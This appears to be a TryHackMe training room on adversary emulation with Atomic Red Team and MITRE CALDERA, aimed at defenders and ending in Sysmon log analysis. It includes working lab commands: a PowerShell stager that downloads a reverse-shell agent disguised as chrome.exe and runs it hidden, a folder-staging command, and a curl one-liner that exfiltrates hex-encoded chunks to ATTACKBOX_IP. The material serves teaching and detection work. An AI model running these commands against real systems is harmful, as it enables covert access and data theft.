The execution of the following commands below resulted in a new user named **THM_Atomic**.

The result can then be verified by checking the local users via **net.exe**. The user **THM_Atomic** was successfully created, as shown in the output below.

powershell.exe

```
PS C:\Users\Administrator> net user

User accounts for \\ATOMIC

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
THM_Atomic               WDAGUtilityAccount
The command completed successfully.

```

Lastly, these parameters can be used in conjunction with the **cleanup** parameter. Given the case, you need to specify the values used to revert successfully after the execution.

powershell.exe

```
PS C:\Users\Administrator> Invoke-AtomicTest T1136.001 -TestNumbers 3 -PromptForInputArgs -Cleanup
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Enter a value for password , or press enter to accept the default.
Password of the user to create [T1136.001_CMD!]:
Enter a value for username , or press enter to accept the default.
Username of the user to create [T1136.001_CMD]: THM_Atomic
Executing cleanup for test: T1136.001-3 Create a new user in a command prompt
Done executing cleanup for test: T1136.001-3 Create a new user in a command prompt
PS C:\Users\Administrator> net users

User accounts for \\ATOMIC

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed successfully.

```

The command snippet above shows that the newly created account was successfully removed from the users' list.

One last important thing to highlight is that not all Atomics can use this functionality. Only the Atomics that have ****defined the **input_arguments** section can change values during execution. If you need to execute a more specific test, you may create your Atomic test.

# Creating New Atomic Tests

The
 Invoke-AtomicRedTeam module also has a functionality that eases up the 
creation of Atomic Tests, and it is named the Atomic GUI.

The Atomic GUI is a web-based form that users can fill out to generate the YAML definition of Atomic Tests. The result of this tool can then be inserted into the appropriate Atomic technique.

To start the web application, execute **Start-AtomicGUI** via PowerShell.

powershell.exe

```
PS C:\Users\Administrator> Start-AtomicGui
Stopped all AtomicGUI Dashboards

Name      Port Running DashboardService
----      ---- ------- ----------------
AtomicGUI 8487    True UniversalDashboard.Services.DashboardService

```

Once the tool runs, access the application using the URL  [http://localhost:8487/home](http://localhost:8487/home) via a browser.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57ab25271e628d707672a7f96a3842a9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57ab25271e628d707672a7f96a3842a9.png)

*Click to enlarge the image.*

You may observe that all the values needed for a test can be quickly filled out, like:

- Atomic Test Name and Definition
- Supported Platforms
- Attack Commands, Command Executor, Required Elevation and Cleanup Commands
- Custom input arguments
- Prerequisites and their Executor

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/da7561c12b05fccef734c589f36d762a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/da7561c12b05fccef734c589f36d762a.png)

*Click to enlarge the image.*

After writing the values, you can generate the output by clicking **GENERATE TEST DEFINITION**. This results in a YAML output that can be inserted into any Atomic Techniques needing modification.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f7f073d8b442be8844656bf5585faa61.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f7f073d8b442be8844656bf5585faa61.png)

*Click to enlarge the image.*

Note: Add two spaces to align the Atomic Tests in the target Atomic YAML file. You may click the highlighted button above twice to insert the appropriate indentation.

**Conclusion**

Congratulations! You have completed the Atomic Red Team room.

Throughout the room, we have tackled the following topics about how Blue Teamers can leverage Atomic Red Team:

- Breakdown of each Atomic, the main component of the Atomic Red Team Framework.
- Tools such as **Invoke-AtomicRedTeam** and **ATT&CK Navigator** to model and execute threat activity.
- Importance of reverting or cleaning up after conducting the tests.
- Logging and Detection Rules review based on the emulation activity.
- Customisation of Atomic tests for the specific needs during testing.
- Case study simulation to emulate the activity of a known threat group.

Threat
 Emulation Frameworks such as the Atomic Red Team are commonly viewed as
 a tool only for Red Teamers, yet being knowledgeable about it may aid 
in learning how threat actors do the job. Knowing how attackers do it 
simplifies understanding how to defend it.

## **CALDERA**

# What is CALDERA?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fbff8be5efc5ffd6ff3f2c9b046ed2bb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fbff8be5efc5ffd6ff3f2c9b046ed2bb.png)

[CALDERA™](https://github.com/mitre/caldera)

is an open-source framework designed to run autonomous adversary 
emulation exercises efficiently. It enables users to emulate real-world 
attack scenarios and assess the effectiveness of their security 
defences.

In addition, it provides a modular environment for red 
team engagements, supporting red team operators for the manual execution
 of TTPs and blue teamers for automated incident response actions.

Lastly, CALDERA is built on the [MITRE ATT&CK framework](https://attack.mitre.org/) and is an active research project at MITRE. All the credit goes to MITRE for creating this fantastic framework.

# Use Cases of CALDERA

Security analysts can leverage the CALDERA framework in different cases, but the common usages of CALDERA are as follows:

- **Autonomous Red Team Engagements:** The original CALDERA use case. The framework is built to emulate known
adversary profiles to see gaps across your organisation's
infrastructure. This use case allows you to test your defences and train your team on detecting threats.
- **Manual Red Team Engagements**: Aside from automating adversary profiles, CALDERA can be customised
based on your red team engagement needs. It allows you to replace or
extend the attack capabilities in case a custom set of TTPs are needed
to be executed.
- **Autonomous Incident Response:** As
mentioned, blue teamers can also use CALDERA to perform automated
incident response actions through deployed agents. This functionality
aids in identifying TTPs that other security tools may not detect or
prevent.

# Breaking Down CALDERA

Before
 playing with the CALDERA interface, let's dive deep into the core 
terminologies. The information in this section is required to understand
 the framework better and tailor it based on your engagement needs. 
Let's have a quick run-through of the critical items to be introduced in
 this task.

1. **Agents** are programs continuously connecting to the CALDERA server to pull and execute instructions.
2. **Abilities** are TTP implementations, which the agents execute.
3. **Adversaries** are groups of abilities that are attributed to a known threat group.
4. **Operations** run abilities on agent groups.
5. **Plugins** provide additional functionality over the core usage of the framework.

These topics will be detailed as we go through the task content.

**Agents**

Given
 the name, agents are programs continuously connecting to the CALDERA 
server to pull and execute instructions. These agents communicate with 
the CALDERA server via a contact method initially defined during agent 
installation.

CALDERA has several built-in agent programs, each showcasing a unique functionality. Below are some examples of it:

| **Agent Name** | **Description** |
| --- | --- |
| Sandcat | A GoLang agent that can establish connections through various channels, such as HTTP, GitHub GIST, or DNS tunnelling. |
| Manx | A GoLang agent that connects via the TCP contact and functions as a reverse shell. |
| Ragdoll | A Python agent that communicates via the HTML contact. |

Agents can be placed into a **group** at
 install through command line flags or editing the agent in the UI. 
These groups are used when running an operation to determine which 
agents to execute abilities on.

In addition, groups determine 
whether an agent is a red or a blue agent. Any agent that belongs to the
 blue group will be accessible from the blue dashboard, while all other 
agents will be accessible from the red dashboard.

**Abilities and Adversaries**

An ability is a specific MITRE
 ATT&CK technique implementation which can be executed through the 
agents. These abilities include the following information:

- Commands to be executed
- Compatible platforms and executors (e.g. PowerShell, Windows Command Shell, Bash)
- Payloads to include
- Reference to a module

Adversary
 profiles are groups of abilities showcasing the TTPs attributed to a 
threat actor. Selecting an adversary profile determines which abilities 
will be executed by the agent during an operation.

An example image below lists the abilities under Alice 2.0 adversary profile. Each ability is attributed to a MITRE ATT&CK Tactic and the corresponding techniques to be executed.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8184f6e22e058dbed6456294e053a511.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8184f6e22e058dbed6456294e053a511.png)

***Adversary Profile: TTPs of Alice 2.0***

**Operations**

As
 the name suggests, operations run abilities on agent groups. The 
adversary profiles define which set of abilities will be executed, and 
agent groups determine which agents these abilities will be performed.

During the execution, the planner can determine the order of abilities. A few examples of these are detailed below:

- Atomic - Abilities are executed based on the atomic ordering (Atomic of Atomic Red Team).
- Batch - Abilities are executed all at once.
- Buckets - Abilities are grouped and executed by its ATT&CK tactic.

Given these options, the planner feature allows users to control and give variations to the execution order of abilities during operations.

Aside from the given terminologies above, you also need to understand the following concepts to configure an operation:

- **Fact** - An identifiable information about the target machine. Facts are
required by some abilities to execute properly; hence they should be
provided through fact sources or acquired by a previous ability.
- **Obfuscators** - Sets the obfuscation of each command before being executed by the agent.
- **Jitter** - The frequency of the agents checking in with the CALDERA server.

**Plugins**

Since
 CALDERA is an open-source framework, it is extended by different 
plugins that provide additional functionality over the core usage of the
 framework. By default, CALDERA contains several plugins at users' 
disposal during adversary emulation exercises. A few notable examples 
are the following:

- **Sandcat** - One of the agents available in CALDERA. This agent can be extended and customised through this functionality.
- **Training** - A gamified certification course to learn CALDERA.
- **Response** - Autonomous Incident Response Plugin (will be discussed further in the later tasks)
- **Human** - Allows users to simulate "human" activity, which may provide a benign and realistic environment.

To learn more about the plugins, you may refer to this [link](https://caldera.readthedocs.io/en/latest/Plugin-library.html).

**Running Operations with CALDERA**

Now that we have tackled the core terminologies from the previous task, let's continue by playing with the CALDERA framework.

To start with, let's follow this guide to emulate a single adversary profile successfully:

1. Run the CALDERA instance.
2. Deploy an agent in the target machine.
3. Choose the adversary profile and review the abilities to be executed.
4. Run the operation.
5. Review the results.

**
Connecting to the CALDERA Instance**

To execute the emulation activity, we will be using two machines:

- CALDERA instance running via the AttackBox.
- Windows machine that serves as the VICTIM machine.

The image below summarises the network setup for this room.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/27e982556f638bfc17d53faa8c6f5131.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/27e982556f638bfc17d53faa8c6f5131.svg)

To deploy the VICTIM Server, press the green `Start Machine` button at the top of the task. You may access the machine via RDP with the following credentials:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cbfa0d0f3a7f16cefa9fddd04b6de8d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cbfa0d0f3a7f16cefa9fddd04b6de8d.png)

| **Username** | administrator |
| --- | --- |
| **Password** | Emulation101! |
| **IP Address** | 10.10.55.80 |

For the AttackBox instance, you may hit the `Start AttackBox` button at the top of the room.

Once the AttackBox runs, you may run the CALDERA server by executing the following commands via the terminal:

ubuntu@tryhackme: ~/

```
ubuntu@tryhackme:~$ cd Rooms/caldera/calderaubuntu@tryhackme:~/Rooms/caldera/caldera$ source ../caldera_venv/bin/activate
```

ubuntu@tryhackme: ~/Rooms/caldera/caldera

```
(caldera_venv) ubuntu@tryhackme:~/Rooms/caldera/caldera$ python3 server.py --insecure
---- redacted ---
2023-03-26 10:27:31 - INFO  (hook.py:58 build_docs) Docs built successfully.
2023-03-26 10:27:31 - INFO  (server.py:73 run_tasks) All systems ready.
```

Note that we have executed `source ../caldera_venv/bin/activate`, which indicates that we are using a Python virtual environment to load all modules required by CALDERA.

You may need to wait a few minutes for the CALDERA instance to initialise. Once the output shows `All systems ready`, you may access the CALDERA web application via the AttackBox's port 8888 using the following credentials:

**Username:** `red`

**Password:** `admin`

# Deploying an Agent

Based
 on the provided guide above, the next step is to deploy a CALDERA agent
 to establish continuous access to the victim machine.

To deploy an agent, navigate to the agent's tab by clicking the **agents** button in the sidebar. Then deploy a Manx agent for a Windows platform since the target machine runs a Windows OS.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ae3df462253d6a13183aaa1cfc53d8e7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ae3df462253d6a13183aaa1cfc53d8e7.png)

Next, ensure that the IP Address in the configuration is set to your AttackBox's IP Address since the default value is set to `0.0.0.0`.
 Doing this will ensure the agent will communicate back to your CALDERA 
instance. In addition, you may want to replace the agent's implant name 
and customise it with a more realistic process name, such as `chrome (Google Chrome Process)`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4e1aff198afe78354fc94164760863be.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4e1aff198afe78354fc94164760863be.png)

You may observe that the commands above were replaced with the values you have set.

Lastly,
 copy the first set of commands from your CALDERA instance to establish a
 reverse-shell agent via TCP contact and execute them via PowerShell inside the provided victim server.

**Note: The set of commands below is only for example. Use the commands from your own CALDERA instance.**

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
>> $server="http://10.10.16.23:8888";
>> $socket="10.10.16.23:7010";
>> $contact="tcp";
>> $url="$server/file/download";
>> $wc=New-Object System.Net.WebClient;
>> $wc.Headers.add("platform","windows");
>> $wc.Headers.add("file","manx.go");
>> $data=$wc.DownloadData($url);
>> Get-Process | ? {$_.Path -like "C:\Users\Public\chrome.exe"} | stop-process -f -ea $ErrAction;
>> rm -force "C:\Users\Public\chrome.exe" -ea $ErrAction;
>> ([io.file]::WriteAllBytes("C:\Users\Public\chrome.exe",$data)) | Out-Null;
>> Start-Process -FilePath C:\Users\Public\chrome.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
```

Once done, an agent will spawn in the agent tab showing that the executed PowerShell commands yielded a successful result.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8acd5eecd660dd2549bc1de6d9f7950d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8acd5eecd660dd2549bc1de6d9f7950d.png)

# Adversary Profile

Now that an agent is running on the VICTIM machine, let's review the adversary profile to be executed in the target.

Navigate
 to the adversaries tab via the sidebar and use the search functionality
 to choose a profile. For this test, let's select the **Enumerator** profile.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6d3e5905579a8302b6e944d08e228fff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6d3e5905579a8302b6e944d08e228fff.png)

The
 following profile showcases five abilities to be executed. Each ability
 can be reviewed to verify the commands to be executed. This is an 
essential step in learning the expected results of the test. You may 
click on the abilities to see the execution details.

For a quick example, the image below shows the details of WMIC Process Enumeration. As highlighted, these two fields are significant in understanding the ability. The executor field shows that the ability will be executed via PowerShell, and the command field indicates the complete command line that will be performed.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1ee5df8cceda8b109603f3ac8d2dc5cf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1ee5df8cceda8b109603f3ac8d2dc5cf.png)

# Executing Operations

Now that we have selected the profile to be executed, let's start the operations!

Navigate to the operations tab via the sidebar and click Create **Operation**. Fill up the details and expand the configuration by clicking **Advanced**.

You may need to take note of three things in creating an operation:

- First, you must select the suitable Adversary Profile (Enumerator profile in this case).
- Next, you should select the right group. By selecting red, you will only execute the abilities using the red agents and prevent running the operation on blue agents if there are any.
- Lastly, the commands will be executed without obfuscation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a01d3c36bc6e599066d3bb317fc71840.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a01d3c36bc6e599066d3bb317fc71840.png)

Once configured, start the operation by clicking **Start**. You may observe that the agent executes the list of abilities individually.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5af5d6f74c107726ee5ab662ae58cb73.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5af5d6f74c107726ee5ab662ae58cb73.png)

# Reviewing Results

After
 executing the operation, the next thing to do is to review the results.
 Each ability completed shows the command run and the result of its 
execution. You may view these by clicking **View Command** or **View Output**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/04ac66ef235544881c38fa08254bf679.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/04ac66ef235544881c38fa08254bf679.png)

**Note:
 CALDERA Operations page may show that some abilities failed to execute.
 You may re-run the operation if an ability fails to execute or continue
 with the next task.**

**In-Through-Out**

We
 executed a single adversary profile and its underlying abilities from 
the previous task. Now, we will attempt to customise the framework and 
emulate an attack chain that traverses from Initial Access to Achieving 
the Objective.

For this scenario, we will emulate the following techniques:

| **Tactic** | **Technique** | **Ability Name** |
| --- | --- | --- |
| **Initial Access** | Spearphishing Attachment (T1566.001) | Download Macro-Enabled Phishing Attachment |
| **Execution** | Windows Management Instrumentation (T1047) | Create a Process using WMI Query and an Encoded Command |
| **Persistence** | Boot or Logon Autostart Execution: Winlogon Helper DLL (T1547.004) | Winlogon HKLM Shell Key Persistence - PowerShell |
| **Discovery** | Account Discovery: Local Account (T1087.001) | Identify local users |
| **Collection** | Data Staged: Local Data Staging (T1074.001) | Zip a Folder with PowerShell for Staging in Temp |
| **Exfiltration** | Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (T1048.003) | Exfiltrating Hex-Encoded Data Chunks over HTTP |

# Modifying Existing Abilities

We
 reviewed and executed the abilities from the previous task without 
modifying them. These actions may not always apply to scenarios like our
 current network setup. Some abilities may require downloading a file 
from the internet, and the provided victim machine does not have an 
internet connection. Given this, we must review and modify the abilities to accommodate our network setup.

First, you may navigate to the **abilities**
 tab and use the ability names from the table above to check the 
commands executed by each ability. The image below is an example of 
searching the `Download Macro-Enabled Phishing Attachment` ability.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/efe757bf3c1755f286a2f5bf47aa1327.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/efe757bf3c1755f286a2f5bf47aa1327.png)

You may have observed three things upon checking the abilities:

- `Exfiltrating Hex-Encoded Data Chunks over HTTP` does not exist.
- `Download Macro-Enabled Phishing Attachment` requires downloading a file from the internet.
- `Zip a Folder with PowerShell for Staging in Temp` collects data on a non-existent folder in the target machine.

Since the first item above requires creating a new ability, let's focus on modifying an existing one.

Let's review the command executed by `Download Macro-Enabled Phishing Attachment`.

```powershell
$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
```

Based on the code, it attempts to download a file from GitHub using `Invoke-WebRequest`. In addition, it configures the PowerShell session to enable SSL connection using the line: `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`.

Since
 the command attempts to download from an external resource, we need to 
replace this with a URL reachable by the victim server. We can set up a 
Python HTTP server via our AttackBox instance. Open a new terminal in the AttackBox and execute the following commands:

ubuntu@tryhackme: ~/

```
ubuntu@tryhackme:~$ cd Rooms/caldera/http_serverubuntu@tryhackme:~/Rooms/caldera/http_server$ python3 -m http.server 8080Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

**Note: The original file required from GitHub is already hosted in the `http_server` directory.**

Now that we have a new URL, navigate back to the `Download Macro-Enabled Phishing Attachment` and replace the command field with the new value. Once done, save the ability to complete the modification. You must replace the ATTACKBOX_IP value with your current AttackBox IP address.

```powershell
$url = 'http://ATTACKBOX_IP:8080/PhishingAttachment.xlsm'; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1aa39df6e9c27f27b2ab80872e01080d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1aa39df6e9c27f27b2ab80872e01080d.png)

To continue the modification of files, let's review the command of the `Zip a Folder with PowerShell for Staging in Temp` ability.

```powershell
Compress-Archive -Path PathToAtomicsFolder\T1074.001\bin\Folder_to_zip -DestinationPath $env:TEMP\Folder_to_zip.zip -Force
```

Based on the code snippet, it attempts to compress the contents of `PathToAtomicsFolder\T1074.001\bin\Folder_to_zip`. We can replace this with a new value, such as `$env:USERPROFILE\Downloads`,
 pointing to the current user's Downloads directory. And to fully 
customise the command, we can also replace the target archive name with `exfil.zip`.

```powershell
Compress-Archive -Path $env:USERPROFILE\Downloads -DestinationPath $env:TEMP\exfil.zip -Force
```

Lastly, we must replace the target file in the cleanup script. The image below summarises the modifications made to the ability.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1172df92ea46a002081950f80dc564b4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/1172df92ea46a002081950f80dc564b4.png)

# Creating a Custom Ability

As mentioned above, the ability `Exfiltrating Hex-Encoded Data Chunks over HTTP` does
 not exist, so we must create a new ability to complete the emulation 
activity. The goal is to execute a command that exfiltrates the 
collected data from the `Zip a Folder with PowerShell for Staging in Temp` ability.

To do this, we will use the following PowerShell commands to hex-encode the data, split it into chunks, and send it to the existing HTTP listener (running on port 8080) from the AttackBox instance. Again, replace the ATTACKBOX_IP value below with the correct AttackBox IP address.

```powershell
$file="$env:TEMP\exfil.zip"; $destination="http://ATTACKBOX_IP:8080/"; $bytes=[System.IO.File]::ReadAllBytes($file); $hex=($bytes|ForEach-Object ToString X2) -join ''; $split=$hex -split '(\S{20})' -ne ''; ForEach ($line in $split) { curl.exe "$destination$line" } echo "Done exfiltrating the data. Check your listener."
```

The command above executes the following:

- Reads all bytes from the target file (`$env:TEMP\exfil.zip`).
- Encodes all bytes into hex.
- Splits the hex data for every 20 characters.
- Sends the data via a cURL GET request to the HTTP listener with the following format: `http://ATTACKBOX_IP/<20 bytes of hex data>`

Now, let's continue creating the ability by navigating to the ability tab and clicking **Create an Ability**. Fill up the fields with the following details:

| **Field** | **Value** |
| --- | --- |
| Name | Exfiltrating Hex-Encoded Data Chunks over HTTP |
| Description | This ability exfiltrates a file by sending chunked hex-encoded data via cURL GET requests. |
| Tactic and Technique | exfiltration - Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003) |
| Singleton, Repeatable, Delete Payload | Unchecked |
| Platform and Executor | windows - psh |
| Command | Use the provided command above |

You may refer to the following images below as a guide for creating the ability. Note that the values used in the screenshot are the ones provided above.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/41f2782724c534c6c99f9db4cbbda779.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/41f2782724c534c6c99f9db4cbbda779.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2691cb451efa5d3dcbfd58cbf6dfdb12.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2691cb451efa5d3dcbfd58cbf6dfdb12.png)

Once done, save the new ability by clicking the save button in the lower-right corner.

# Creating a Custom Adversary Profile

Now that we have prepared all the abilities, our next step is to create a new adversary profile. Navigate back to the **adversaries** tab and click **New Profile**.
 The required values for each field are arbitrary, but for the 
consistency of task instructions, you may fill up the fields with the 
following details:

| Field | Value |
| --- | --- |
| Profile Name | Emulation Activity #1 |
| Profile Description | This profile executes six abilities from different tactics, emulating a complete attack chain. |

After populating the fields, click the **Create** button to proceed.

The next step to complete the profile is to populate it with the abovementioned abilities. You may click the **Add Ability** button and search for the abilities we need to emulate.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/999c2bbb6774e28d4aec0acd1d5f3f75.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/999c2bbb6774e28d4aec0acd1d5f3f75.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b410821d3ef5248fdc983e925554136b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b410821d3ef5248fdc983e925554136b.png)

You may use this list as a reference for the abilities mentioned at the start of this task:

- Download Macro-Enabled Phishing Attachment
- Create a Process using WMI Query and an Encoded Command
- Winlogon HKLM Shell Key Persistence - PowerShell
- Identify local users
- Zip a Folder with PowerShell for Staging in Temp
- Exfiltrating Hex-Encoded Data Chunks over HTTP

Once you have selected the ability to add, click `Save & Add` to append it to the adversary profile.

**Note: The abilities can still be modified before adding them to a profile.**

Once you have populated the list of abilities, don't forget to save it to complete the preparation before our operation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/007e93c7627fc2646d55071fc186f975.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/007e93c7627fc2646d55071fc186f975.png)

# Running the Operation and Reviewing Results

Now that the new profile is ready, execute an operation using the **Emulation Activity #1** profile and review the results to answer the questions below.

**Emulation to Detection**

From
 the previous tasks, we have been executing TTPs and reviewing them 
through the CALDERA instance. Now, let's view the events generated by 
our emulation activity through log and detection analysis.

The provided victim machine is configured to log events and detect malicious activity with the following tools:

- Sysmon
- AuroraEDR

For this task, we will re-execute **Emulation Activity #1** and use these tools to review the events from the perspective of a blue teamer. Given this, we will mainly use the provided RDP access to the VICTIM server to conduct the analysis.

# Sysmon

As mentioned, Sysmon
 is installed and running on the target machine. The easiest way to 
access the logs is to use the Windows Event Viewer pinned in the taskbar
 and navigate to `Applications and Services > Microsoft > Windows > Sysmon`.
 You may observe that some of the TTPs executed by our custom profile 
are already logged. An example image below shows the execution of the `Create a Process using WMI Query and an Encoded Command` ability.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e4657874c146fce13e26e9000f85d912.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e4657874c146fce13e26e9000f85d912.png)

***Click to enlarge the image***

You
 may clear these logs before re-running the adversary profile to better 
view what logs are generated during the emulation activity.

We can re-execute the operation by stopping it and clicking **Re-run operation**.
 However, this automatically starts the operation, which will generate 
logs continuously until the execution of the last ability and will make 
it hard to analyse the execution of each ability. But if you prefer to 
analyse all logs in one go, feel free to use this functionality to start
 analysing logs after everything has been generated.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e991ed7cb5f62f72db98075ef4360314.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e991ed7cb5f62f72db98075ef4360314.png)

Given
 this, we will create a new operation using the same profile but with a 
configuration allowing us to run abilities individually. The only 
difference from our previous setup is that the **Run State** is set to **Pause on Start** instead of Run immediately. Don't forget to start the operation by clicking the **start** button in the lower-right corner.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/bcee7c907f832dd2787b47da284f0f50.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/bcee7c907f832dd2787b47da284f0f50.png)

With this new configuration, you may see that the operation is paused upon start. Given this, we can use the **Run 1 Link** feature to execute a single ability at a time.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3cdfa9bb37787f125bdd00e69a9a5550.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3cdfa9bb37787f125bdd00e69a9a5550.png)

Upon checking the logs after refreshing the Event Viewer, it only generated four Sysmon events. This view is better than flooding it with overwhelming logs after you execute all abilities in one go.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2612870dc739191111e55fabf61cf73a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2612870dc739191111e55fabf61cf73a.png)

You may proceed with executing the next ability, reviewing and clearing the logs until you complete the operation.

Note
 that other processes might generate some irrelevant logs. To have a 
clear understanding of the execution flow, always start your analysis 
from the log that contains `ParentImage: C:\Users\Public\chrome.exe`. This is the process name of our CALDERA agent that executes the commands of each ability.

# Sysmon Log Analysis via PowerShell

We
 can use PowerShell to analyse Sysmon Logs as an alternative for Event 
Viewer. We will use Get-WinEvent to print the logs and Clear-WinEvent to
 clear the logs before executing the following ability. Note that the [Clear-WinEvent](https://www.powershellgallery.com/packages/PSGumshoe/1.7/Content/EventLog%5CClear-WinEvent.ps1) command is not a built-in functionality, so we must import it before proceeding.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> Import-Module .\Clear-WinEvent.ps1
PS C:\Tools> help Clear-WinEvent

NAME
    Clear-WinEvent

SYNOPSIS
    Clears events from event logs and event tracing log files on local and remote computers.
--- redacted ---
```

After loading the module, we can start doing the same methodology of 
running a single ability, reviewing it and clearing its logs. Let's 
continue by executing the following ability.

Administrator: Windows PowerShell

```
PS C:\Tools> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | fl
TimeCreated  : 3/30/2023 2:55:47 PM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: T1060
               EventType: SetValue
               UtcTime: 2023-03-30 14:55:47.011
               ProcessGuid: {c5d2b969-a2f2-6425-0e01-000000002401}
               ProcessId: 2524
               Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
               Details: explorer.exe, C:\Windows\System32\cmd.exe
               User: VICTIM\Administrator
---redacted---
